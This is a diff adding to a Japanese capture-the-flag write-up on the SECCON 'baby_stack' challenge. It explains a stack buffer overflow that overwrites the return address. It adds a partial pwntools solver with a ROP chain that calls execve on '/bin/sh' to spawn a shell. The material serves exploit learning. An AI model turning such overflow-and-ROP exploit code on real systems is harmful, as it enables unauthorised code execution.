@@ -259,10 +259,96 @@ gef➤
 
      ここまでの調査で、スタックバッファオーバフローが発生する箇所を特定できた。
      次に、この脆弱性を用いてどのようにして任意のアドレスに飛ばすか考える。
+
+     ここで、スタックの続きを見てみると、 ~rsp + 0x148~ にあたるアドレスに、リターンアドレスが格納されていることがわかる。
+
+     #+begin_example
+...     
+0x000000c820051e90│+0x0140: 0x0000000000000000
+0x000000c820051e98│+0x0148: 0x000000000040ea82  →  <runtime.newobject+66> mov rbx, QWORD PTR [rsp+0x18] <- 後にRIPに格納される値
+...
+     #+end_example
+     そこで、このアドレスを書き換えることにより、任意のアドレスへのジャンプを行う。
+
+     次に、RIPの書き換えを行ったのち、シェルを起動する方法を考える。
+
      
 ** 2. 配布された実行ファイルの静的解析
 
 ** solver
+
+   途中まで
+   #+begin_src python
+from pwn import *
+
+filename = './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'
+chall = ELF(filename)
+
+# docker-compose up
+# conn = remote('localhost', 9001)
+conn = process(filename)
+
+# ROP Gadgets
+sh_str = 0x4d1f72
+bss_addr = 0x000000000058e000
+
+hoge_str = 0x000000c8200a2000
+
+## 0x00000000004026da: syscall;
+syscall = 0x00000000004026da
+
+## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;
+pop_rdi = 0x0000000000470931
+
+## 0x000000000046defd: pop rsi; ret;
+pop_rsi = 0x000000000046defd
+
+## 0x00000000004016ea: pop rax; ret;
+pop_rax = 0x00000000004016ea
+
+## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;
+pop_rdx = 0x0000000000448145
+
+
+# Input name (First input)
+buf1 = b"hoge"
+conn.sendline(buf1)
+
+# Input msg (Second input)
+# 0x000000c820047db0│+0x0060: 0x0000000061677566 ("fuga"?)
+# ...
+# 0x000000c820047e98│+0x0148: <runtime.newobject+66> mov rbx, QWORD PTR [rsp+0x18]
+# 0x000000c820051f48│+0x0200: 0x0000000000429ef0  →  <runtime.main+688> mov ebx, DWORD PTR [rip+0x1903c2]        # 0x5ba2b8 <runtime.panicking>
+
+# buf2 = b'a'*0x20
+buf2 = b'a'*(0x88-0x60)
+buf2 += p64(hoge_str)
+buf2 += b'a'*(0xc8-0x60-len(buf2))
+buf2 += p64(hoge_str)
+buf2 += b'a'*(0x128-0x60-len(buf2))
+buf2 += p64(hoge_str)
+# buf2 += b'a'*(0x148-0x60-len(buf2))
+# buf2 += p64(hoge_str)
+buf2 += b'a'*(0x1f8-0x60-len(buf2))
+
+# buf2 = b'\x00'*(0x1f8-0x60)
+
+# ROP
+buf2 += p64(pop_rdx)
+buf2 += p64(0)
+buf2 += b'a'*0x38
+buf2 += p64(pop_rsi)
+buf2 += p64(0)
+buf2 += p64(pop_rdi)
+buf2 += p64(sh_str)
+buf2 += p64(pop_rax)
+buf2 += p64(59)
+buf2 += p64(syscall)
+
+conn.sendline(buf2)
+
+conn.interactive()
+   #+end_src
 
 *** Flag
     ~SECCON{---}~
